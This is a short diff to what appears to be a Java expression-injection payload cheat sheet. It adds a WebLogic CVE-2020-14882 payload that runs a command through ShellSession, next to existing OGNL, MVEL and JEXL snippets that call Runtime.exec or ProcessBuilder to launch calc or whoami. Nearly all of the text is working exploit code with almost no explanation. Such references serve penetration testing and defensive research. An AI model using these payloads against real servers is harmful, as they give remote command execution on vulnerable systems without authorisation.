@@ -318,6 +318,11 @@ Ognl.getValue("@java.lang.Runtime@getRuntime().exec('calc')", context, context.g
 String expression = "new java.lang.ProcessBuilder(/"calc/").start();";  
 MVEL.eval(expression, vars);
 ```
+```java
+// weblogic CVE-2020-14882
+com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('calc.exe');");
+```
+
 - JEXL
 ```java
 String Exp = "233.class.forName('java.lang.Runtime').getRuntime().exec('whoami')";
